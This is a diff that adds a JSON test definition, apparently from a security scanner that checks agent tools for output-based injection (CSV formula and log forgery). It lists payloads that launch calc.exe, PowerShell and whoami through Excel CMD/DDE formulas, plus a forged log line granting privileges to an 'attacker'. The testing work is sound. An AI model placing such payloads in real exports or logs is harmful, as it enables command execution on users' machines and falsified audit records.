@@ -1,0 +1,24 @@
+{
+  "id": "output_injection",
+  "category": "C6",
+  "subcategory": "output_based_injection",
+  "cwe": "CWE-1236",
+  "cvss_reference": "CVE-2025-13133",
+  "description": "Inject CSV formula characters or log-forgery sequences into write/record tools. The payload is stored successfully but executes when output is opened in Excel, a log viewer, or another downstream consumer.",
+  "match_rules": {
+    "tool_name_contains": ["write", "create", "record", "append", "store", "export", "log", "insert", "add", "save", "post"]
+  },
+  "payloads": [
+    {"label": "excel_cmd",       "value": "=CMD(\"calc.exe\")"},
+    {"label": "excel_plus",      "value": "+CMD(\"powershell\")"},
+    {"label": "excel_at",        "value": "@SUM(1+1)*cmd|' /C calc'!A0"},
+    {"label": "log_forgery",     "value": "\nINFO [admin] privilege_granted=true user=attacker"},
+    {"label": "dde_payload",     "value": "=DDE(\"cmd\",\"/C whoami\",\"1\")"}
+  ],
+  "benign_payload": "hello world",
+  "expected_score_range": [6, 10],
+  "expected_benign_range": [1, 3],
+  "damage_indicator": "stored|saved|created|inserted|appended|written|success|ok|true|accepted",
+  "taxonomy_tier": 1,
+  "observability": "none"
+}
